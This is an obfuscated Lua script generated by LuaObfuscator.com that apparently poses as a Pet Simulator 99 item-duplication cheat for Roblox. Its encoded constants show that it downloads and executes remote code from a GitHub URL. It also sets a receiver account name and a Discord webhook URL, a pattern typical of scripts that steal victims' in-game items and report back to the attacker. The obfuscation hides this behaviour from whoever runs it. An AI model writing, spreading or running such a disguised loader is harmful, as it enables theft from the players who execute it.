--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v81=v2(v0(v30,16));if v19 then local v88=v5(v81,v19);v19=nil;return v88;else return v81;end end end);local function v20(v31,v32,v33) if v33 then local v82=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + (932 -(857 + (1711 -(1523 + 114)))))) ;return v82-(v82%(569 -(367 + 201))) ;else local v83=927 -(214 + 713) ;local v84;while true do if (v83==(0 + 0)) then v84=(879 -(282 + 595))^(v32-(1 + 0)) ;return (((v31%(v84 + v84))>=v84) and 1) or 0 ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + 2 + 0 );v18=v18 + 2 ;return (v36 * (364 -108)) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + (1068 -(68 + 997)) );v18=v18 + (1274 -(226 + 1044)) ;return (v40 * ((16200264 + 56854510) -56277558)) + (v39 * (65653 -((989 -(892 + 65)) + 85))) + (v38 * (251 + 5)) + v37 ;end local function v24() local v41=v23();local v42=v23();local v43=1;local v44=(v20(v42,2 -1 ,47 -27 ) * ((3 -1)^(58 -26))) + v41 ;local v45=v20(v42,38 -17 ,381 -(87 + 263) );local v46=((v20(v42,212 -((1553 -(998 + 488)) + 113) )==(1 + 0)) and  -(2 -1)) or (1 + 0 + 0) ;if (v45==(0 + 0)) then if (v44==(791 -(368 + 423))) then return v46 * ((772 -(201 + 571)) -(1138 -(116 + 1022))) ;else local v89=18 -(10 + 8) ;while true do if (v89==(952 -(802 + 150))) then v45=2 -1 ;v43=(0 -0) -0 ;break;end end end elseif (v45==(1490 + 557)) then return ((v44==(997 -(915 + 82))) and (v46 * ((2 -1)/(0 + 0 + 0)))) or (v46 * NaN) ;end return v8(v46,v45-(3734 -2711) ) * (v43 + (v44/((2 -0)^(1239 -((3795 -2726) + 118))))) ;end local function v25(v47) local v48;if  not v47 then v47=v23();if (v47==(859 -(814 + 45))) then return "";end end v48=v3(v16,v18,(v18 + v47) -(2 -1) );v18=v18 + v47 ;local v49={};for v64=1 + 0 , #v48 do v49[v64]=v2(v1(v3(v48,v64,v64)));end return v6(v49);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v50=(function() return 0;end)();local v51=(function() return;end)();local v52=(function() return;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();while true do local v66=(function() return 0 -0 ;end)();while true do if (v66==1) then if ((1 + 0)~=v50) then else local v94=(function() return 0;end)();local v95=(function() return;end)();while true do if (v94==0) then v95=(function() return 0;end)();while true do if (v95~=(2 -0)) then else v50=(function() return 2 -0 ;end)();break;end if (v95==(1385 -(746 + 638))) then v57=(function() return {};end)();for v155= #"~",v56 do local v156=(function() return 0 + 0 ;end)();local v157=(function() return;end)();local v158=(function() return;end)();local v159=(function() return;end)();while true do if (v156~=1) then else v159=(function() return nil;end)();while true do if (v157~=(1 -0)) then else if (v158== #"}") then v159=(function() return v21()~=0 ;end)();elseif (v158==(343 -(218 + 123))) then v159=(function() return v24();end)();elseif (v158~= #"asd") then else v159=(function() return v25();end)();end v57[v155]=(function() return v159;end)();break;end if (0==v157) then local v187=(function() return 0;end)();local v188=(function() return;end)();while true do if (v187~=0) then else v188=(function() return 1581 -(1535 + 46) ;end)();while true do if (v188==(1 + 0)) then v157=(function() return 1;end)();break;end if ((0 + 0)~=v188) then else v158=(function() return v21();end)();v159=(function() return nil;end)();v188=(function() return 561 -(306 + 254) ;end)();end end break;end end end end break;end if (0~=v156) then else local v181=(function() return 0 + 0 ;end)();while true do if (v181~=(0 -0)) then else v157=(function() return 1467 -(899 + 568) ;end)();v158=(function() return nil;end)();v181=(function() return 1;end)();end if (v181~=1) then else v156=(function() return 1 + 0 ;end)();break;end end end end end v95=(function() return 4 -2 ;end)();end if (v95~=(603 -(268 + 335))) then else v55=(function() return {v52,v53,nil,v54};end)();v56=(function() return v23();end)();v95=(function() return 291 -(60 + 230) ;end)();end end break;end end end break;end if (v66==(572 -(426 + 146))) then if (v50~=(0 + 0)) then else local v96=(function() return 0;end)();while true do if (v96==(1456 -(282 + 1174))) then v51=(function() return function(v120,v121,v122) local v123=(function() return 0;end)();local v124=(function() return;end)();while true do if (0~=v123) then else v124=(function() return 0;end)();while true do if (v124==(811 -(569 + 242))) then local v182=(function() return 0;end)();local v183=(function() return;end)();while true do if (v182==0) then v183=(function() return 0;end)();while true do if (v183~=0) then else v120[v121-#"\\" ]=(function() return v122();end)();return v120,v121,v122;end end break;end end end end break;end end end;end)();v52=(function() return {};end)();v96=(function() return 1;end)();end if (v96~=(5 -3)) then else v50=(function() return 1 + 0 ;end)();break;end if ((1025 -(706 + 318))~=v96) then else v53=(function() return {};end)();v54=(function() return {};end)();v96=(function() return 2;end)();end end end if (v50==(1253 -(721 + 530))) then v55[ #"gha"]=(function() return v21();end)();for v98= #"~",v23() do local v99=(function() return v21();end)();if (v20(v99, #"!", #">")~=(1271 -(945 + 326))) then else local v101=(function() return 0;end)();local v102=(function() return;end)();local v103=(function() return;end)();local v104=(function() return;end)();local v105=(function() return;end)();while true do if (v101==(2 -1)) then local v127=(function() return 0;end)();local v128=(function() return;end)();while true do if (v127==(0 + 0)) then v128=(function() return 0;end)();while true do if (v128==(700 -(271 + 429))) then local v185=(function() return 0 + 0 ;end)();while true do if (v185~=1) then else v128=(function() return 1501 -(1408 + 92) ;end)();break;end if (v185==(1086 -(461 + 625))) then v104=(function() return nil;end)();v105=(function() return nil;end)();v185=(function() return 1289 -(993 + 295) ;end)();end end end if (v128~=(1 + 0)) then else v101=(function() return 1173 -(418 + 753) ;end)();break;end end break;end end end if (v101==(0 + 0)) then v102=(function() return 0;end)();v103=(function() return nil;end)();v101=(function() return 1;end)();end if (v101~=2) then else while true do if (v102==(0 + 0)) then local v170=(function() return 0 + 0 ;end)();local v171=(function() return;end)();while true do if (v170~=(0 + 0)) then else v171=(function() return 529 -(406 + 123) ;end)();while true do if (v171~=0) then else v103=(function() return v20(v99,1771 -(1749 + 20) , #"-19");end)();v104=(function() return v20(v99, #".dev",6);end)();v171=(function() return 1 + 0 ;end)();end if (v171==1) then v102=(function() return  #"[";end)();break;end end break;end end end if (v102~= #"xxx") then else if (v20(v104, #"91(", #"19(")~= #"<") then else v105[ #"xnxx"]=(function() return v57[v105[ #"0313"]];end)();end v52[v98]=(function() return v105;end)();break;end if (v102~=2) then else local v173=(function() return 1322 -(1249 + 73) ;end)();local v174=(function() return;end)();while true do if (v173==0) then v174=(function() return 0 + 0 ;end)();while true do if (v174==(1145 -(466 + 679))) then if (v20(v104, #"}", #"{")~= #"}") then else v105[4 -2 ]=(function() return v57[v105[5 -3 ]];end)();end if (v20(v104,1902 -(106 + 1794) ,2)== #",") then v105[ #"xnx"]=(function() return v57[v105[ #"19("]];end)();end v174=(function() return 1 + 0 ;end)();end if (v174==(1 + 0)) then v102=(function() return  #"19(";end)();break;end end break;end end end if (v102~= #",") then else local v175=(function() return 0;end)();local v176=(function() return;end)();while true do if (v175~=0) then else v176=(function() return 0 -0 ;end)();while true do if (v176==1) then v102=(function() return 5 -3 ;end)();break;end if (v176~=0) then else v105=(function() return {v22(),v22(),nil,nil};end)();if (v103==(584 -(57 + 527))) then local v192=(function() return 0;end)();local v193=(function() return;end)();while true do if (v192==(1427 -(41 + 1386))) then v193=(function() return 0;end)();while true do if (v193==(103 -(17 + 86))) then v105[ #"xxx"]=(function() return v22();end)();v105[ #".com"]=(function() return v22();end)();break;end end break;end end elseif (v103== #"|") then v105[ #"-19"]=(function() return v23();end)();elseif (v103==(2 + 0)) then v105[ #"gha"]=(function() return v23() -((3 -1)^16) ;end)();elseif (v103~= #"xxx") then else local v198=(function() return 0 -0 ;end)();local v199=(function() return;end)();while true do if (v198~=0) then else v199=(function() return 0;end)();while true do if (v199~=(166 -(122 + 44))) then else v105[ #"-19"]=(function() return v23() -((2 -0)^(52 -36)) ;end)();v105[ #"?id="]=(function() return v22();end)();break;end end break;end end end v176=(function() return 1;end)();end end break;end end end end break;end end end end for v100= #"\\",v23() do v53,v100,v28=(function() return v51(v53,v100,v28);end)();end return v55;end v66=(function() return 1;end)();end end end end local function v29(v58,v59,v60) local v61=v58[1 + 0 ];local v62=v58[1 + 1 ];local v63=v58[3];return function(...) local v67=v61;local v68=v62;local v69=v63;local v70=v27;local v71=1662 -(1477 + 152 + 32) ;local v72= -((2 -1) -0);local v73={};local v74={...};local v75=v12("#",...) -(1 + 0) ;local v76={};local v77={};for v85=0,v75 do if (v85>=v69) then v73[v85-v69 ]=v74[v85 + 1 ];else v77[v85]=v74[v85 + (1258 -(1043 + 214)) ];end end local v78=(v75-v69) + (3 -2) ;local v79;local v80;while true do v79=v67[v71];v80=v79[1213 -(323 + 889) ];if ((3330>2323) and (v80<=(18 -7))) then if (v80<=5) then if (v80<=(734 -(16 + 716))) then if (v80<=(0 -0)) then do return;end elseif ((v80>(581 -(361 + 219))) or (3626==3989)) then local v129=v79[322 -((902 -(254 + 595)) + 267) ];local v130=v77[v79[1 + (128 -(55 + 71)) ]];v77[v129 + (414 -(15 + 398)) ]=v130;v77[v129]=v130[v79[(632 -152) -((78 -37) + 435) ]];else do return;end end elseif (v80<=(985 -(18 + 964))) then for v125=v79[(1797 -(573 + 1217)) -5 ],v79[2 + 1 ] do v77[v125]=nil;end elseif ((v80==(3 + 1)) or (916==2671)) then v77[v79[852 -((117 -(11 + 86)) + 830) ]]=v60[v79[3 + 0 ]];else local v136=v79[128 -(116 + 10) ];local v137,v138=v70(v77[v136](v13(v77,v136 + (2 -1) + 0 ,v79[741 -(542 + 196) ])));v72=(v138 + v136) -(1 -0) ;local v139=0;for v160=v136,v72 do v139=v139 + 1 + 0 ;v77[v160]=v137[v139];end end elseif (v80<=((290 -(175 + 110)) + 3)) then if ((272==272) and (v80<=(3 + 3))) then v77[v79[4 -(4 -2) ]]=v79[7 -4 ];elseif ((4249<=4839) and (v80>(1558 -(1126 + 425)))) then v77[v79[407 -(118 + 287) ]]=v79[7 -4 ];else v77[v79[7 -5 ]]=v79[1124 -(118 + 1003) ]~=(0 -0) ;end elseif (v80<=(4 + 5)) then local v108=v79[3 -1 ];local v109=v77[v79[380 -(142 + 235) ]];v77[v108 + (4 -3) ]=v109;v77[v108]=v109[v79[(4 -3) + 3 ]];elseif (v80>10) then local v143=977 -(553 + (1174 -750)) ;local v144;while true do if ((2777<3200) and ((0 -0)==v143)) then v144=v79[2 + 0 + 0 ];v77[v144]=v77[v144](v13(v77,v144 + (873 -(826 + 46)) ,v72));break;end end else v77[v79[2 + (1796 -(503 + 1293)) ]]();end elseif (v80<=17) then if (v80<=((13 -4) + 5)) then if ((95<1957) and (v80<=(6 + 6))) then if ((826<1717) and (v77[v79[2]]==v79[(8 -5) + 1 ])) then v71=v71 + (1899 -(260 + 1638)) ;else v71=v79[6 -3 ];end elseif (v80>(35 -(16 + 6))) then v60[v79[6 -3 ]]=v77[v79[1 + (1062 -(810 + 251)) ]];else v77[v79[9 -7 ]]=v60[v79[756 -(239 + 514) ]];end elseif ((1426>=1105) and (v80<=(6 + 7 + 2))) then v71=v79[(2271 -(714 + 225)) -(797 + 532) ];elseif (v80==(34 -(6 + 12))) then local v150=0 + 0 ;local v151;while true do if (v150==(0 -0)) then v151=v79[1 + 1 ];v77[v151]=v77[v151](v13(v77,v151 + (1691 -(1121 + 569)) ,v72));break;end end elseif (v77[v79[(11 -7) -2 ]]==v79[1206 -(373 + 829) ]) then v71=v71 + (732 -(476 + 255)) ;else v71=v79[1133 -(369 + 761) ];end elseif (v80<=(54 -34)) then if (v80<=(11 + 7 + 0)) then v71=v79[(6 -1) -2 ];elseif (v80>(35 -16)) then v77[v79[240 -((597 -(43 + 490)) + 174) ]]();else v60[v79[10 -7 ]]=v77[v79[4 -2 ]];end elseif (v80<=((736 -(711 + 22)) + (69 -51))) then local v115=0 -0 ;local v116;local v117;local v118;local v119;while true do if ((336 -(16 + 128 + 192))==v115) then v116=v79[218 -(42 + (1033 -(240 + 619))) ];v117,v118=v70(v77[v116](v13(v77,v116 + ((2 -0) -1) ,v79[(4 -1) + (806 -(118 + 688)) ])));v115=1 + 0 ;end if ((2754<=3379) and ((1 + (49 -(25 + 23)))==v115)) then for v167=v116,v72 do v119=v119 + ((100 + 1405) -(363 + 1141)) ;v77[v167]=v117[v119];end break;end if ((v115==((3325 -(1344 + 400)) -(1183 + 397))) or (3927==1413)) then v72=(v118 + v116) -(2 -1) ;v119=0 + 0 ;v115=2 + 0 ;end end elseif (v80==(1997 -(1913 + 62))) then v77[v79[1 + 1 + 0 ]]=v79[2 + 1 ]~=(0 -0) ;else for v164=v79[1935 -(565 + (1773 -(255 + 150))) ],v79[(2654 -(927 + 959)) -(574 + 191) ] do v77[v164]=nil;end end v71=v71 + 1 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!0A3Q00028Q00026Q00F03F030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574034B3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F4C796865725363726970742F70732Q392D6475706C69636174696F6E2F6D61696E2F72656C6561736503083Q005265636965766572030C3Q00706C6179657233363539313303073Q00776562682Q6F6B03793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F313331392Q3031383235323134352Q393234302F4E4A634F6D66574C31614C6447706C76312Q4551657046374556323871456F724C75672D414A75476A5F4C49624E4D312D6E2Q3058352D3730676D785A704A35496A433900233Q0012063Q00014Q0017000100013Q00260C3Q0002000100010004123Q00020001001206000100013Q00260C00010010000100020004123Q00100001001204000200033Q001204000300043Q002002000300030005001206000500064Q0007000600014Q0015000300064Q001000023Q00022Q000A0002000100010004123Q0022000100260C00010005000100010004123Q00050001001206000200013Q00260C0002001A000100010004123Q001A0001001206000300083Q001213000300073Q0012060003000A3Q001213000300093Q001206000200023Q00260C00020013000100020004123Q00130001001206000100023Q0004123Q000500010004123Q001300010004123Q000500010004123Q002200010004123Q000200012Q00013Q00017Q00",v9(),...);
